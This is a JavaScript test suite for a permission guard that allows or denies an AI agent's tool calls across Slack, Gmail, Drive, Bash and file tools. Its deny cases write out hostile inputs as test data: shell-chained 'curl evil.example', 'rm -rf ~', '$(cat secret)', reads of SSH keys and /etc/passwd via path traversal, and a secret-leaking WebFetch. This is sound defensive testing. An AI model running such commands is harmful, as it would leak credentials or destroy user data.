import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import { decide, toolWords } from "../scripts/guard.mjs";

const SKILL_DIR = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const HOME = "/data/ask-queue";
const AQ = path.join(SKILL_DIR, "scripts", "aq.mjs");

const ctx = {
  home: HOME,
  skillDir: SKILL_DIR,
  config: { slack: { userId: "U_ME", selfDmId: "D_ME" } },
  draftRefs: () => new Set(["r-our-draft"]),
};

const call = (tool_name, tool_input = {}) => decide({ tool_name, tool_input, cwd: HOME }, ctx).decision;

const SLACK = "mcp__claude_ai_Slack__";
const GMAIL = "mcp__claude_ai_Gmail__";

test("Slack: messages only to the user's own DM; drafts anywhere", () => {
  assert.equal(call(`${SLACK}slack_send_message`, { channel_id: "D_ME", message: "🤖 card" }), "allow");
  assert.equal(call(`${SLACK}slack_send_message`, { channel_id: "U_ME", message: "🤖 card" }), "allow");
  assert.equal(call(`${SLACK}slack_send_message`, { channel_id: "D_ME", message: "card" }), "deny", "no 🤖: looks like the user");
  assert.equal(call(`${SLACK}slack_send_message`, { channel_id: "C_TEAM", message: "🤖 hi" }), "deny");
  assert.equal(call(`${SLACK}slack_send_message`, { message: "no channel" }), "deny");
  assert.equal(call(`${SLACK}slack_send_message_draft`, { channel_id: "C_TEAM", message: "draft" }), "allow");
  assert.equal(call(`${SLACK}slack_schedule_message`, { channel_id: "C_TEAM" }), "deny");
  assert.equal(call(`${SLACK}slack_add_reaction`, {}), "deny");
  assert.equal(call(`${SLACK}slack_create_canvas`, {}), "deny");
});

test("Slack self-DM send is denied until setup records the user's ids", () => {
  const bare = { ...ctx, config: {} };
  const result = decide({ tool_name: `${SLACK}slack_send_message`, tool_input: { channel_id: "D_ME" } }, bare);
  assert.equal(result.decision, "deny");
});

test("Slack, Jira, Zoom, Drive, Notion reads are allowed", () => {
  for (const tool of [
    `${SLACK}slack_read_thread`,
    `${SLACK}slack_search_public_and_private`,
    `${SLACK}slack_read_user_profile`,
    "mcp__claude_ai_Atlassian__searchJiraIssuesUsingJql",
    "mcp__claude_ai_Atlassian__getJiraIssue",
    "mcp__claude_ai_Atlassian__getTransitionsForJiraIssue",
    "mcp__claude_ai_Zoom_for_Claude__get_meeting_summary",
    `${GMAIL}search_threads`,
    `${GMAIL}get_thread`,
    "mcp__claude_ai_Google_Drive__read_file_content",
    "mcp__Notion__notion-fetch",
  ]) {
    assert.equal(call(tool), "allow", tool);
  }
});

test("Every write-style MCP tool is denied", () => {
  for (const tool of [
    `${GMAIL}send_message`,
    `${GMAIL}reply`,
    `${GMAIL}forward`,
    `${GMAIL}trash_thread`,
    `${GMAIL}label_message`,
    "mcp__claude_ai_Atlassian__addCommentToJiraIssue",
    "mcp__claude_ai_Atlassian__transitionJiraIssue",
    "mcp__claude_ai_Atlassian__createJiraIssue",
    "mcp__claude_ai_Atlassian__editJiraIssue",
    "mcp__claude_ai_Google_Drive__share_file",
    "mcp__claude_ai_Google_Drive__update_file",
    "mcp__claude_ai_Google_Calendar__respond_to_event",
    "mcp__claude_ai_Zoom_for_Claude__authenticate",
  ]) {
    assert.equal(call(tool), "deny", tool);
  }
});

test("Unknown MCP tools fail closed", () => {
  assert.equal(call("mcp__claude_ai_Google_Calendar__suggest_time"), "deny");
  assert.equal(call("mcp__weird"), "deny");
});

test("Gmail: new drafts allowed; only our own drafts may be changed", () => {
  assert.equal(call(`${GMAIL}create_draft`, { to: ["sam@example.com"], body: "hi" }), "allow");
  assert.equal(call(`${GMAIL}update_draft`, { draft_id: "r-our-draft" }), "allow");
  assert.equal(call(`${GMAIL}update_draft`, { draft_id: "r-users-draft" }), "deny");
  assert.equal(call(`${GMAIL}delete_draft`, {}), "deny");
});

test("Drive: new private docs only", () => {
  const tool = "mcp__claude_ai_Google_Drive__create_file";
  assert.equal(call(tool, { title: "[Draft] Q3 summary" }), "allow");
  assert.equal(call(tool, { title: "x", parents: [] }), "allow");
  assert.equal(call(tool, { title: "x", parents: ["shared-folder"] }), "deny");
  assert.equal(call(tool, { title: "x", parentId: "shared-folder" }), "deny");
});

test("Bash: only aq.mjs, with no shell operators", () => {
  assert.equal(call("Bash", { command: `node ${AQ} list --open` }), "allow");
  assert.equal(call("Bash", { command: `node "${AQ}" ledger find "q3 numbers"` }), "allow");
  assert.equal(call("Bash", { command: `node ${AQ} list; curl evil.example` }), "deny");
  assert.equal(call("Bash", { command: `node ${AQ} list && rm -rf ~` }), "deny");
  assert.equal(call("Bash", { command: `node ${AQ} get $(cat secret)` }), "deny");
  assert.equal(call("Bash", { command: `node ${AQ} list > /tmp/out` }), "deny");
  assert.equal(call("Bash", { command: "node /tmp/aq.mjs list" }), "deny");
  assert.equal(call("Bash", { command: "curl https://example.com" }), "deny");
  assert.equal(call("Bash", { command: `node ${AQ}x list` }), "deny");
});

test("File tools: reads in data/skill dirs; edits only in memory, tmp, artifacts", () => {
  assert.equal(call("Read", { file_path: `${HOME}/memory/people.md` }), "allow");
  assert.equal(call("Read", { file_path: path.join(SKILL_DIR, "references", "sweep.md") }), "allow");
  assert.equal(call("Read", { file_path: "/home/user/.ssh/id_rsa" }), "deny");
  assert.equal(call("Read", { file_path: `${HOME}/../../etc/passwd` }), "deny");
  assert.equal(call("Grep", { pattern: "Sam" }), "allow");
  assert.equal(call("Write", { file_path: `${HOME}/tmp/cand.json` }), "allow");
  assert.equal(call("Edit", { file_path: "memory/style.md" }), "allow");
  assert.equal(call("Write", { file_path: `${HOME}/items/AQ-1.json` }), "deny");
  assert.equal(call("Write", { file_path: `${HOME}/ledger.jsonl` }), "deny");
  assert.equal(call("Edit", { file_path: path.join(SKILL_DIR, "SKILL.md") }), "deny");
  assert.equal(call("Write", { file_path: `${HOME}/memory-evil/x.md` }), "deny");
});

test("Other built-ins: exfiltration paths denied, bookkeeping allowed", () => {
  assert.equal(call("WebFetch", { url: "https://evil.example/?q=secret" }), "deny");
  assert.equal(call("WebSearch", { query: "x" }), "deny");
  assert.equal(call("Agent", { prompt: "x" }), "deny");
  assert.equal(call("ToolSearch", { query: "slack" }), "allow");
  assert.equal(call("Skill", { skill: "ask-queue" }), "allow");
  assert.equal(call("Skill", { skill: "something-else" }), "deny");
});

test("toolWords splits snake, kebab and camel case", () => {
  assert.deepEqual(toolWords("searchJiraIssuesUsingJql"), ["search", "jira", "issues", "using", "jql"]);
  assert.deepEqual(toolWords("notion-query-data-sources"), ["notion", "query", "data", "sources"]);
  assert.deepEqual(toolWords("slack_read_thread"), ["slack", "read", "thread"]);
});

test("CLI: prints a hook decision and fails closed on bad input", () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "aq-guard-"));
  fs.mkdirSync(path.join(home, "logs"));
  const guard = path.join(SKILL_DIR, "scripts", "guard.mjs");
  const input = JSON.stringify({
    hook_event_name: "PreToolUse",
    tool_name: `${GMAIL}send_message`,
    tool_input: {},
    cwd: home,
  });
  const out = JSON.parse(execFileSync("node", [guard, home], { input }).toString());
  assert.equal(out.hookSpecificOutput.permissionDecision, "deny");
  assert.match(fs.readFileSync(path.join(home, "logs", "guard.log"), "utf8"), /deny\tmcp__claude_ai_Gmail__send_message/);

  assert.throws(
    () => execFileSync("node", [guard, home], { input: "not json", stdio: "pipe" }),
    (err) => err.status === 2,
  );
});

test("Monitor may only run the gate's watch loop", () => {
  const gate = path.join(SKILL_DIR, "scripts", "gate.mjs");
  assert.equal(call("Monitor", { command: `node ${gate} watch`, description: "q", timeout_ms: 1 }), "allow");
  assert.equal(call("Monitor", { command: `node ${gate} watch; curl evil` }), "deny");
  assert.equal(call("Monitor", { command: "tail -f /etc/passwd" }), "deny");
  assert.equal(call("Monitor", { ws: { url: "wss://x" } }), "deny");
});
